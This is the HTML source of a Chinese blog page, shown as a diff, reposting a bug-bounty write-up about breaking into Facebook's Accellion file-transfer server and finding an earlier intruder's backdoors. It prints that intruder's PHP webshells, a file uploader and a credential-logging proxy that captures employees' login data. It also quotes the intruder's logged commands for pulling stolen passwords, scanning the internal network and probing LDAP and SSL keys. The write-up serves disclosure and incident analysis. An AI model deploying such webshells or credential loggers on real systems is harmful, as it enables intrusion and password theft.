@@ -1,157 +1,446 @@
-<!DOCTYPE html>
-<html>
 
+ <!DOCTYPE HTML>
+<html  xmlns:wb="http://open.weibo.com/wb">
 <head>
-  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
-  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-  <title>渗透Facebook的思路与发现 | Blog of Secer</title>
-  <meta name="description" content="" />
-  <meta name="HandheldFriendly" content="True" />
-  <meta name="MobileOptimized" content="320" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
-  <link rel="stylesheet" type="text/css" href="/css/style.css" />
-  <meta name="generator" content="Blog of Secer">
-
+  <meta charset="UTF-8">
   
-  
-  
-
-  
+    <title>渗透Facebook的思路与发现 | Blog of Secer</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=3, minimum-scale=1">
+    
+    <meta name="author" content="Secer">
+    
+    <meta name="description" content="写在故事之前  身为一位渗透测试人员，比起 Client Side 的弱点我更喜欢 Server Side 的攻击，能够直接的控制服务器、获得权限操作 SHELL 才爽 &amp;lt;(￣︶￣)&amp;gt;  当然一次完美的渗透任何形式的弱点都不可小觑，在实际渗透时偶尔还是需要些 Client Side 弱点组合可以更完美的控制服务器，但是在寻找弱点时我本身还是先偏向以可直接进入服务器的方式来去寻找风险高、能长驱直入的弱点。  随着 Facebook 在世界上越来越火红、用户量越来越多，一直以来都有想要尝试看看的想法，恰巧 Facebook 在 2012 年开始有了 Bug Bounty 奖金猎人的机制让我更跃跃欲试。  一般如由渗透的角度来说习惯性都会从收集数据、侦查开始，首先界定出目标在网络上的 “范围” 有多大，姑且可以评估一下从何处比较有机会下手。例如:  Google Hacking 到什么数据?  用了几个 B 段的 IP ? C 段的 IP ?  Whois? Reverse Whois?  用了什么域名? 内部使用的域名? 接着做子域名的猜测、扫描  公司平常爱用什么样技术、设备?  在 Github, Pastebin 上是否有泄漏什么信息?  …etc  当然 Bug Bounty 并不是让你无限制的攻击，将所搜集到的范围与 Bug Bounty 所允许的范围做交集后才是你真正可以去尝试的目标。  一般来说大公司在渗透中比较容易出现的问题点这里举几个例子来探讨     对多数大公司而言，&amp;quot;网络边界”是比较难顾及、容易出现问题的一块，当公司规模越大，同时拥有数千、数万台机器在线，网管很难顾及到每台机器。在攻防里，防守要防的是一个面，但攻击只需 找个一个点就可以突破，所以防守方相对处于弱势，攻击者只要找到一台位于网络边界的机器入侵进去就可以开始在内网进行渗透了!    对于 “连网设备” 的安全意识相对薄弱，由于连网设备通常不会提供 SHELL 给管理员做进一步的操作，只能由设备本身所提供的接口设定，所以通常对于设备的防御都是从网络层来抵挡，但如遇到设备本身的 0-Day 或者是 1-Day 可能连被入侵了都不自觉。    人的安全，随着 “社工库” 的崛起，有时可以让一次渗透的流程变得异常简单，从公开数据找出公司员工列表，再从社工库找到可以登入 VPN 的员工密码就可以开始进行内网渗透，尤其当社工库数量越来越多 “量变成质变” 时只要关键人物的密码在社工库中可找到，那企业的安全性就全然突破。   理所当然在寻找 Facebook 弱点时会以平常进行渗透的思路进行，在开始搜集数据时除了针对 Facebook 本身域名查询外也对注册信箱进行 Reverse Whois 意外发现了个奇妙的域名名称">
+    
+    
+    
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:site" content="333" />
+    <meta name="twitter:title" content="渗透Facebook的思路与发现 | Blog of Secer" />
+      
+    
+    
+    <link rel="alternate" href="atom.xml" title="Blog of Secer" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/pacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/pacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css">
 </head>
 
-<!--
-<body class="post-template">
--->
-<body class="home-template">
-<div id="perspective" class="perspective effect-movedown">
-  <div class="container">
-    <!-- wrapper -->
-    <div class="wrapper">
+  <body>
+    <header>
+      <div>
+		
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="Blog of Secer">Blog of Secer</a></h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">首页</a></li>
+					
+						<li><a href="/archives">文章</a></li>
+					
+						<li><a href="/about">关于</a></li>
+					
+						<li><a href="/atom.xml">RSS订阅</a></li>
+					
+					<li>
+					
+					<form class="search" action="/search/index.html" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="text" id="search" name="q" autocomplete="off" maxlength="30" placeholder="Search" />
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
 
-      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
-    <div class="vertical">
-        <div class="site-head-content inner">
-             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
-            <h1 class="blog-title">Blog of Secer</h1>
-            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
-        </div>
-    </div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/1138.seo/" title="渗透Facebook的思路与发现" itemprop="url">渗透Facebook的思路与发现</a>
+  </h1>
+  <!-- 显示作者
+  <p class="article-author">By
+    
+      <a href="http://ha.cker.in" title="Secer">Secer</a>
+    </p>
+  -->  
+  <p class="article-time">
+    <time datetime="2016-04-26T23:12:44.000Z" itemprop="datePublished">2016-04-27</time>
+    Updated:<time datetime="2016-08-20T11:03:54.000Z" itemprop="dateModified">2016-08-20</time>
+    
+  </p>
 </header>
 
-      
+	<div class="article-content">
+		
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">Contents</strong>
+		
+		</div>
+		
+		<p><b>写在故事之前</b></p>  <p>身为一位<a href="http://ha.cker.in/tag/渗透测试" target="_blank">渗透测试</a>人员，比起 Client Side 的弱点我更喜欢 Server Side 的攻击，能够直接的控制服务器、获得权限操作 SHELL 才爽 &lt;(￣︶￣)&gt;</p>  <p>当然一次完美的渗透任何形式的弱点都不可小觑，在实际渗透时偶尔还是需要些 Client Side 弱点组合可以更完美的控制服务器，但是在寻找弱点时我本身还是先偏向以可直接进入服务器的方式来去寻找风险高、能长驱直入的弱点。</p>  <p>随着 <a href="http://ha.cker.in/tag/Facebook" target="_blank">Facebook</a> 在世界上越来越火红、用户量越来越多，一直以来都有想要尝试看看的想法，恰巧 <a href="http://ha.cker.in/tag/Facebook" target="_blank">Facebook</a> 在 2012 年开始有了 <a href="https://www.facebook.com/whitehat/" target="_blank" rel="external">Bug Bounty</a> 奖金猎人的机制让我更跃跃欲试。</p>  <p>一般如由渗透的角度来说习惯性都会从收集数据、侦查开始，首先界定出目标在网络上的 “范围” 有多大，姑且可以评估一下从何处比较有机会下手。例如:</p>  <p>Google Hacking 到什么数据?</p>  <p>用了几个 B 段的 IP ? C 段的 IP ?</p>  <p>Whois? Reverse Whois?</p>  <p>用了什么域名? 内部使用的域名? 接着做子域名的猜测、扫描</p>  <p>公司平常爱用什么样技术、设备?</p>  <p>在 Github, Pastebin 上是否有泄漏什么信息?</p>  <p>…etc</p>  <p>当然 Bug Bounty 并不是让你无限制的攻击，将所搜集到的范围与 Bug Bounty 所允许的范围做交集后才是你真正可以去尝试的目标。</p>  <p>一般来说大公司在渗透中比较容易出现的问题点这里举几个例子来探讨</p>  <ol>   <li>对多数大公司而言，&quot;<b>网络边界</b>”是比较难顾及、容易出现问题的一块，当公司规模越大，同时拥有数千、数万台机器在线，网管很难顾及到每台机器。在攻防里，防守要防的是一个面，但攻击只需 找个一个点就可以突破，所以防守方相对处于弱势，攻击者只要找到一台位于网络边界的机器入侵进去就可以开始在内网进行渗透了!</li>    <li>对于 “<b>连网设备</b>” 的安全意识相对薄弱，由于连网设备通常不会提供 SHELL 给管理员做进一步的操作，只能由设备本身所提供的接口设定，所以通常对于设备的防御都是从网络层来抵挡，但如遇到设备本身的 0-Day 或者是 1-Day 可能连被入侵了都不自觉。</li>    <li>人的安全，随着 “<a href="http://ha.cker.in/tag/社工库" target="_blank">社工库</a><b></b>” 的崛起，有时可以让一次渗透的流程变得异常简单，从公开数据找出公司员工列表，再从社工库找到可以登入 VPN 的员工密码就可以开始进行内网渗透，尤其当社工库数量越来越多 “<b>量变成质变</b>” 时只要关键人物的密码在社工库中可找到，那企业的安全性就全然突破。</li> </ol>  <p>理所当然在寻找 <a href="http://ha.cker.in/tag/Facebook" target="_blank">Facebook</a> 弱点时会以平常进行渗透的思路进行，在开始搜集数据时除了针对 Facebook 本身域名查询外也对注册信箱进行 Reverse Whois 意外发现了个奇妙的域名名称</p><br><a id="more"></a><br><p><b>tfbnw</b>.net</p>  <p>TFBNW 似乎是 “<b>TheFacebook Network</b>”的缩写    <br>再藉由公开资料发现存在下面这台这台服务器</p>  <p><b>vpn</b>.tfbnw.net</p>  <p>哇! vpn.tfbnw.net 看起来是个 Juniper <a href="http://ha.cker.in/tag/SSL VPN" target="_blank">SSL VPN</a> 的登入接口，不过版本满新的没有直接可利用的弱点，不过这也成为了进入后面故事的开端。</p>  <p>TFBNW 看似是 <a href="http://ha.cker.in/tag/Facebook" target="_blank">Facebook</a> 内部用的域名，来扫扫 vpn.tfbnw.net 同网段看会有什么发现</p>  <ul>   <li>Mail Server Outlook Web App</li>    <li>F5 BIGIP SSL VPN</li>    <li>CISCO ASA SSL VPN</li>    <li>Oracle E-Business</li>    <li>MobileIron MDM</li> </ul>  <p>从这几台机器大致可以判断这个网段对于 Facebook 来说应该是相对重要的网段，之后一切的故事就从这里开始。</p>  <p><b>弱点发现</b></p>  <p>在同网段中，发现一台特别的服务器</p>  <p><b>files</b>.fb.com</p>  <p><i><a href="http://image.3001.net/images/20160425/14615710669457.jpg" target="_blank" rel="external"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/Facebook_D5C9/clip_image002.jpg" width="694" height="376"></a></i></p>  <p><i>files.fb.com </i><i>登入界面</i></p>  <p>从 LOGO 以及 Footer 判断应该是 Accellion 的 Secure File Transfer (以下简称 FTA)</p>  <p>FTA 为一款标榜安全文件传输的产品，可让用户在线分享、同步档案，并整合 AD, LDAP, Kerberos 等 Single Sign-on 机制，Enterprise 版本更支持 SSL VPN 服务。</p>  <p>首先看到 FTA 的第一件事是去网络上搜寻是否有公开的 Exploit 可以利用，Exploit 最近的是由 HD Moore 发现并发布在 Rapid7 的这篇 Advisory</p>  <ul>   <li><a href="https://community.rapid7.com/community/metasploit/blog/2015/07/10/r7-2015-08-accellion-file-transfer-appliance-vulnerabilities-cve-2015-2856-cve-2015-2857" target="_blank" rel="external">Accellion File Transfer Appliance Vulnerabilities (CVE-2015-2856, CVE-2015-2857)</a></li> </ul>  <p>弱点中可直接从 “<b>/tws/getStatus</b>” 中泄漏的版本信息判断是否可利用，在发现 files.fb.com 时版本已从有漏洞的 0.18 升级至 0.20 了，不过就从 Advisory 中所透露的片段程序代码感觉 FTA 的撰写风格如果再继续挖掘可能还是会有问题存在的，所以这时的策略便开始往寻找 FTA 产品的 0-Day 前进!</p>  <p>不过从实际黑箱的方式其实找不出什么问题点只好想办法将方向转为白箱测试，透过各种方式拿到旧版的 FTA 原始码后终于可以开始研究了!</p>  <p>整个 FTA 产品大致架构：</p>  <p>网页端接口主要由 Perl 以及 PHP 构成</p>  <p>PHP 原始码皆经过 IonCube 加密</p>  <p>在背景跑了许多 Perl 的 Daemon</p>  <p>首先是解密 IonCude 的部分，许多设备为了防止自己的产品被检视所以会将原始码加密，不过好在 FTA 上的 IonCude 版本没到最新，可以使用现成的工具解密，不过由于 PHP 版本的问题，细节部份以及数值运算等可能要靠自己修复一下，不然有点难看…</p>  <p>经过简单的原始码审查后发现，好找的弱点应该都被 Rapid7 找走了 T^T   <br>而需要认证才能触发的漏洞又不怎么好用，只好认真点往深层一点的地方挖掘!</p>  <p>经过几天的认真挖掘，最后总共发现了七个弱点，其中包含了</p>  <p>Cross-Site Scripting x 3</p>  <p>Pre-Auth SQL Injection leads to Remote Code Execution</p>  <p>Known-Secret-Key leads to Remote Code Execution</p>  <p>Local Privilege Escalation x 2</p>  <p>除了回报 Facebook 安全团队外，其余的弱点也制作成 Advisory 提交 Accellion 技术窗口，经过厂商修补提交 CERT/CC 后取得四个 CVE 编号：</p>  <p>CVE-2016-2350</p>  <p>CVE-2016-2351</p>  <p>CVE-2016-2352</p>  <p>CVE-2016-2353</p>  <p>详细的弱点细节会待 Full Disclosure Policy 后公布!</p>  <p><a href="http://image.3001.net/images/20160425/14615712074623.jpg" target="_blank" rel="external"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image003" border="0" alt="clip_image003" src="http://img.cker.in/Facebook_D5C9/clip_image003.jpg" width="694" height="415"></a></p>  <p>使用 Pre-Auth SQL Injection 写入 Webshell</p>  <p>在实际渗透中进去服务器后的第一件事情就是检视当前的环境是否对自己人善，为了要让自己可以在服务器上待的久就要尽可能的了解服务器上有何限制、纪录，避开可能会被发现的风险 </p>  <p>Facebook 大致有以下限制：</p>  <p>防火墙无法连外, TCP, UDP, 53, 80, 443 皆无法</p>  <p>存在远程的 Syslog 服务器</p>  <p>开启 <a href="http://ha.cker.in/tag/Auditd" target="_blank">Auditd</a> 记录</p>  <p>无法外连看起来有点麻烦，但是 ICMP Tunnel 看似是可行的，但这只是一个 Bug Bounty Program 其实不需要太麻烦就纯粹以 <a href="http://ha.cker.in/tag/WebShell" target="_blank">Webshell</a> 操作即可。</p>  <p><b>似乎有点奇怪?</b></p>  <p>正当收集证据准备回报 Facebook 安全团队时，从网页日志中似乎看到一些奇怪的痕迹。</p>  <p>首先是在 “<b>/var/opt/apache/php_error_log</b>” 中看到一些奇怪的 PHP 错误讯息，从错误讯息来看似乎像是边改 Code 边执行所产生的错误?</p>  <p><a href="http://image.3001.net/images/20160425/1461571392935.jpg" target="_blank" rel="external"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004" border="0" alt="clip_image004" src="http://img.cker.in/Facebook_D5C9/clip_image004.jpg" width="694" height="376"></a></p>  <p><i> PHP error log</i></p>  <p>跟随错误讯息的路径去看发现疑似前人留下的 Webshell 后门</p>  <p><a href="http://image.3001.net/images/20160425/14615714539437.jpg" target="_blank" rel="external"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image005" border="0" alt="clip_image005" src="http://img.cker.in/Facebook_D5C9/clip_image005.jpg" width="694" height="534"></a></p>  <p><i>Webshell on facebook server</i></p>  <p>其中几个档案的内容如下</p>  <p><b>sshpass</b></p>  <p>没错，就是那个 <a href="http://linux.die.net/man/1/sshpass" target="_blank" rel="external">sshpass</a></p>  <p><b>bN3d10Aw.php</b></p>  <p>&lt;?phpecho shell_exec($_GET[‘c’]); ?&gt;</p>  <p><b>uploader.php</b></p>  <p>&lt;?phpmove_uploaded_file($_FILES[&quot;f][&quot;tmp_name&quot;], basename($_FILES[&quot;f&quot;][&quot;name&quot;]));?&gt;</p>  <p><b>d.php</b></p>  <p>&lt;?phpinclude_oncce(&quot;/home/seos/courier/remote.inc&quot;); echo decrypt($_GET[&quot;c&quot;]);?&gt;</p>  <p><b>sclient_user_class_standard.inc</b></p>  <p>&lt;?php</p>  <p>include_once(‘sclient_user_class_standard.inc.orig’);</p>  <p>$fp= fopen(&quot;/home/seos/courier/B3dKe9sQaa0L.log&quot;, &quot;a&quot;); </p>  <p>$retries= 0;</p>  <p>$max_retries= 100; </p>  <p>//省略…</p>  <p>fwrite($fp,date(&quot;Y-m-d H:i:s T&quot;) . &quot;;&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]. &quot;;&quot; . $_SERVER[&quot;HTTP_USER_AGENT&quot;] . &quot;;POST=&quot; . http_build_query($_POST). &quot;;GET=&quot; . http_build_query($_GET) . &quot;;COOKIE=&quot; . http_build_query($_COOKIE). &quot;\n&quot;); </p>  <p>//省略…</p>  <p>前几个就是很标准的 PHP 一句话木马   <br>其中比较特别的是 “<b>sclient_user_class_standard.inc</b>” 这个档案</p>  <p>include_once 中 “<b>sclient_user_class_standard.inc.orig</b>”为原本对密码进行验证的 PHP 程序，黑客做了一个 Proxy 在中间并在进行一些重要操作时先把 GET, POST, COOKIE 的值记录起来</p>  <p>整理一下，黑客做了一个 Proxy 在密码验证的地方，并且记录 Facebook 员工的账号密码，并且将记录到的密码放置在 Web 目录下，黑客每隔一段时间使用 wget 抓取</p>  <p>wget<a href="https://files.fb.com/courier/B3dKe9sQaa0L.log" target="_blank" rel="external">https://files.fb.com/courier/B3dKe9sQaa0L.log</a></p>  <p><a href="http://image.3001.net/images/20160425/14615715182217.jpg" target="_blank" rel="external"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image006" border="0" alt="clip_image006" src="http://img.cker.in/Facebook_D5C9/clip_image006.jpg" width="653" height="92"></a></p>  <p>↑ Logged passwords</p>  <p>从纪录里面可以看到除了用户账号密码外，还有从 FTA 要求档案时的信件内容，记录到的账号密码会定时 Rotate (后文会提及，这点还满机车的XD)</p>  <p>发现当下，最近一次的 Rotate 从 2/1 记录到 2/7 共约 300 笔账号密码纪录，大多都是 “<b>@fb.com</b>” 或是 “<b>@facebook.com</b>” 的员工帐密，看到当下觉得事情有点严重了，在 FTA 中，使用者的登入主要有两种模式</p>  <ol>   <li>一般用户注册，密码 Hash 存在数据库，由 SHA256 + SALT 储存</li>    <li>Facebook 员工 (@fb.com) 则走统一认证，使用 LDAP 由 AD 认证</li> </ol>  <p>在这里相信记录到的是真实的员工账号密码，<b><strong>猜测</strong></b> 这份账号密码应该可以通行 Facebook Mail OWA, VPN 等服务做更进一步的渗透…</p>  <p>此外，这名 “黑客” 可能习惯不太好</p>  <ol>   <li>后门参数皆使用 GET 来传递，在网页日志可以很明显的发现他的足迹</li>    <li>黑客在进行一些指令操作时没顾虑到 STDERR ，导致网页日志中很多指令的错误讯息，从中可以观察黑客做了哪些操作</li> </ol>  <p>从 access.log 可以观察到的每隔数日黑客会将记录到的账号密码清空</p>  <p>1cattmp_list3_2 | <b>while</b> <b>read</b> line; <b>do</b> cp /home/filex2/1000/$line files; done2&gt;/dev/stdout92.168.54.13- - 17955 [Sat, 23 Jan 2016 19:04:10 +0000 | 1453575850] &quot;GET/courier/custom_template/1000/bN3dl0Aw.php?c=./sshpass -p ‘<strong><em>**</em></strong>‘ ssh -v -oStrictHostKeyChecking=no soggycat@localhost ‘cp/home/seos/courier/B3dKe9sQaa0L.log /home/seos/courier/B3dKe9sQaa0L.log.2; echo&gt; /home/seos/courier/B3dKe9sQaa0L.log’ 2&gt;/dev/stdout HTTP/1.1&quot; 200 2559…</p>  <p> cattmp_list3_2 | <b>while</b> read line; <b>do</b> cp /home/filex2/1000/$line files; <b>done</b>2&gt;/dev/stdout</p>  <p><b>tar-czvf</b> <b>files</b>.tar.gz <b>files</b></p>  <p>打包档案</p>  <p>对内部网络结构进行探测</p>  <p><b>diga</b> archibus.thefacebook.com</p>  <p>telnetarchibus.facebook.com 80</p>  <p>curl<a href="http://archibus.thefacebook.com/spaceview_facebook/locator/room.php" target="_blank" rel="external">http://archibus.thefacebook.com/spaceview_facebook/locator/room.php</a></p>  <p>diga records.fb.com</p>  <p>telnetrecords.fb.com 80</p>  <p>telnetrecords.fb.com 443</p>  <p>wget-O- -q <a href="http://192.168.41.16" target="_blank" rel="external">http://192.168.41.16</a></p>  <p>diga acme.facebook.com</p>  <p>./sshpass-p ‘<strong><em>**</em></strong>‘ ssh -v -o StrictHostKeyChecking=no soggycat@localhost ‘for i in $(seq201 1 255); do for j in $(seq 0 1 255); do echo &quot;192.168.$i.$j:<code>dig +shortptr $j.$i.168.192.in-addr.arpa</code>&quot;; done; done’ 2&gt;/dev/stdout</p>  <p>…</p>  <p>使用 Shell Script 进行内网扫描但忘记把 STDERR 导掉XD</p>  <p><a href="http://image.3001.net/images/20160425/14615716777793.jpg" target="_blank" rel="external"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image007" border="0" alt="clip_image007" src="http://img.cker.in/Facebook_D5C9/clip_image007.jpg" width="694" height="376"></a></p>  <p>尝试对内部 <a href="http://ha.cker.in/tag/LDAP" target="_blank">LDAP</a> 进行连接</p>  <p>sh:-c: line 0: syntax error near unexpected token <code>(&#39;&lt;/p&gt;  &lt;p&gt;sh:-c: line 0:</code>ldapsearch -v -x -H ldaps://ldap.thefacebook.com -bCN=svc-accellion,OU=Service Accounts,DC=thefacebook,DC=com -w ‘<b><strong>*</strong></b><i><em>**</em></i>‘ -sbase (objectclass=) 2&gt;/dev/stdout’</p>  <p>尝试访问内部网络资源   <br>( 看起来 Mail OWA 可以直接访问 …)</p>  <p>–20:38:09–&#160; <a href="https://mail.thefacebook.com/" target="_blank" rel="external">https://mail.thefacebook.com/</a></p>  <p>Resolvingmail.thefacebook.com… 192.168.52.37</p>  <p>Connectingto mail.thefacebook.com|192.168.52.37|:443… connected.</p>  <p>HTTPrequest sent, awaiting response… 302 Found</p>  <p>Location:<a href="https://mail.thefacebook.com/owa/" target="_blank" rel="external">https://mail.thefacebook.com/owa/</a> [following]</p>  <p>–20:38:10–&#160; <a href="https://mail.thefacebook.com/owa/" target="_blank" rel="external">https://mail.thefacebook.com/owa/</a></p>  <p>Reusingexisting connection to mail.thefacebook.com:443.</p>  <p>HTTPrequest sent, awaiting response… 302 Moved Temporarily</p>  <p>Location:<a href="https://mail.thefacebook.com/owa/auth/logon.aspx?url=https://mail.thefacebook.com/owa/&amp;reason=0[following" target="_blank" rel="external">https://mail.thefacebook.com/owa/auth/logon.aspx?url=https://mail.thefacebook.com/owa/&amp;reason=0[following</a>]</p>  <p>–20:38:10– <a href="https://mail.thefacebook.com/owa/auth/logon.aspx?url=https://mail.thefacebook.com/owa/&amp;reason=0" target="_blank" rel="external">https://mail.thefacebook.com/owa/auth/logon.aspx?url=https://mail.thefacebook.com/owa/&amp;reason=0</a></p>  <p>Reusingexisting connection to mail.thefacebook.com:443.</p>  <p>HTTPrequest sent, awaiting response… 200 OK</p>  <p>Length:8902 (8.7K) [text/html]</p>  <p>Savingto: <code>STDOUT&#39;&lt;/p&gt;  &lt;p&gt;&amp;#160;&amp;#160;&amp;#160;&amp;#160; 0K ........&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; 100% 1.17G=0s&lt;/p&gt;  &lt;p&gt;20:38:10(1.17 GB/s) -</code>-‘ saved [8902/8902]</p>  <p>–20:38:33–&#160; (try:15) <a href="https://10.8.151.47/" target="_blank" rel="external">https://10.8.151.47/</a></p>  <p>Connectingto 10.8.151.47:443… –20:38:51– <a href="https://svn.thefacebook.com/" target="_blank" rel="external">https://svn.thefacebook.com/</a></p>  <p>Resolvingsvn.thefacebook.com… failed: Name or service not known.</p>  <p>–20:39:03–&#160; <a href="https://sb-dev.thefacebook.com/" target="_blank" rel="external">https://sb-dev.thefacebook.com/</a></p>  <p>Resolvingsb-dev.thefacebook.com… failed: Name or service not known.</p>  <p>failed:Connection timed out.</p>  <p>Retrying.</p>  <p>尝试对 SSL Private Key 下手</p>  <p>sh:/etc/opt/apache/ssl.crt/server.crt: Permission denied</p>  <p>ls:/etc/opt/apache/ssl.key/server.key: No such file <b>or</b> directory</p>  <p>mv:cannot <b>stat</b> <code>x&#39;: No such file or directory&lt;/p&gt;  &lt;p&gt;sh:/etc/opt/apache/ssl.crt/server.crt: Permission denied&lt;/p&gt;  &lt;p&gt;mv:cannot stat</code><b>x</b>‘: No such file or directory</p>  <p>sh:/etc/opt/apache/ssl.crt/server.crt: Permission denied</p>  <p>mv:cannot stat <code>x&#39;: No such file &lt;b&gt;or&lt;/b&gt; directory&lt;/p&gt;  &lt;p&gt;sh:/etc/opt/apache/ssl.crt/server.crt: Permission denied&lt;/p&gt;  &lt;p&gt;mv:cannot &lt;b&gt;stat&lt;/b&gt;</code>x’: No such file or directory</p>  <p>sh:/etc/opt/apache/ssl.crt/server.crt: Permission denied</p>  <p>mv:cannot stat `<b>x</b>‘: No such file or directory</p>  <p>sh:/etc/opt/apache/ssl.crt/server.crt: Permission denied</p>  <p>base64:invalid input</p>  <p><a href="http://image.3001.net/images/20160425/14615717098042.jpg" target="_blank" rel="external"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image008" border="0" alt="clip_image008" src="http://img.cker.in/Facebook_D5C9/clip_image008.jpg" width="568" height="515"></a></p>  <p>从浏览器观察 files.fb.com 的凭证还是 Wildcard 的 *.fb.com …</p>  <p><b>后记</b></p>  <p>在收集完足够证据后便立即回报给 Facebook 安全团队，回报内容除了漏洞细节外，还附上相对应的 Log 、截图以及时间纪录xD</p>  <p>从服务器中的日志可以发现有两个时间点是明显黑客在操作系统的时间，一个是七月初、另个是九月中旬</p>  <p>七月初的动作从纪录中来看起来比较偏向 “逛” 服务器，但九月中旬的操作就比较恶意了，除了逛街外，还放置了密码 Logger 等，至于两个时间点的 “黑客” 是不是同一个人就不得而知了    <br>而七月发生的时机点正好接近 CVE-2015-2857 Exploit 公布前，究竟是透过 1-Day 还是无 0-Day 入侵系统也无从得知了。</p>  <p>这件事情就记录到这里，总体来说这是一个非常有趣的经历xD   <br>也让我有这个机会可以来写写关于渗透的一些文章 </p>  <p>最后也感谢 Bug Bounty 及胸襟宽阔的 Facebook 安全团队 让我可以完整记录这起事件 : )</p>  <p><b>Timeline</b></p>  <ul>   <li>2016/02/05 20:05 提供漏洞详情给 Facebook 安全团队</li>    <li>2016/02/05 20:08 收到机器人自动回复</li>    <li>2016/02/06 05:21 提供弱点 Advisory 给 Accellion 技术窗口</li>    <li>2016/02/06 07:42 收到 Thomas 的回复，告知调查中</li>    <li>2016/02/13 07:43 收到 Reginaldo 的回复，告知 Bug Bounty 奖金 $10000 USD</li>    <li>2016/02/13 询问是否撰写 Blog 是否有任何要注意的地方?</li>    <li>2016/02/13 询问此漏洞被认为是 RCE 还是 SQL Injection</li>    <li>2016/02/18 收到 Reginaldo 的回复，告知正在进行调查中，希望 Blog 先暂时不要发出</li>    <li>2016/02/24 收到 Hai 的回复，告知奖金将会于三月发送</li>    <li>2016/04/20 收到 Reginaldo 的回复，告知调查已完成</li> </ul>  <p>刚好最近有一篇Hacking Team渗透过程说明，两个渗透过程可以搭配着看</p>  <p>全文轉自：<a href="http://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script/" target="_blank" rel="external">http://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script/</a></p>  
+	</div>
+		<footer class="article-footer clearfix">
+<div class="article-share" id="share">
 
-<main class="content" role="main">
-  <article class="post">
-    <span class="post-meta">
-      <time datetime="2016-04-26T23:12:44.000Z" itemprop="datePublished">
-          2016-04-27
-      </time>
-    
-    
-    | 
-    <a href='/tag/渗透测试/'>渗透测试</a>,
-    
-    <a href='/tag/Facebook/'>Facebook</a>,
-    
-    <a href='/tag/社工库/'>社工库</a>,
-    
-    <a href='/tag/SSL-VPN/'>SSL VPN</a>,
-    
-    <a href='/tag/Auditd/'>Auditd</a>
-    
-    
-</span>
-    <h1 class="post-title">渗透Facebook的思路与发现</h1>
-    <section class="post-content">
-      <p><b>写在故事之前</b></p>  <p>身为一位<a href="http://ha.cker.in/tag/渗透测试" target="_blank">渗透测试</a>人员，比起 Client Side 的弱点我更喜欢 Server Side 的攻击，能够直接的控制服务器、获得权限操作 SHELL 才爽 &lt;(￣︶￣)&gt;</p>  <p>当然一次完美的渗透任何形式的弱点都不可小觑，在实际渗透时偶尔还是需要些 Client Side 弱点组合可以更完美的控制服务器，但是在寻找弱点时我本身还是先偏向以可直接进入服务器的方式来去寻找风险高、能长驱直入的弱点。</p>  <p>随着 <a href="http://ha.cker.in/tag/Facebook" target="_blank">Facebook</a> 在世界上越来越火红、用户量越来越多，一直以来都有想要尝试看看的想法，恰巧 <a href="http://ha.cker.in/tag/Facebook" target="_blank">Facebook</a> 在 2012 年开始有了 <a href="https://www.facebook.com/whitehat/" target="_blank" rel="external">Bug Bounty</a> 奖金猎人的机制让我更跃跃欲试。</p>  <p>一般如由渗透的角度来说习惯性都会从收集数据、侦查开始，首先界定出目标在网络上的 “范围” 有多大，姑且可以评估一下从何处比较有机会下手。例如:</p>  <p>Google Hacking 到什么数据?</p>  <p>用了几个 B 段的 IP ? C 段的 IP ?</p>  <p>Whois? Reverse Whois?</p>  <p>用了什么域名? 内部使用的域名? 接着做子域名的猜测、扫描</p>  <p>公司平常爱用什么样技术、设备?</p>  <p>在 Github, Pastebin 上是否有泄漏什么信息?</p>  <p>…etc</p>  <p>当然 Bug Bounty 并不是让你无限制的攻击，将所搜集到的范围与 Bug Bounty 所允许的范围做交集后才是你真正可以去尝试的目标。</p>  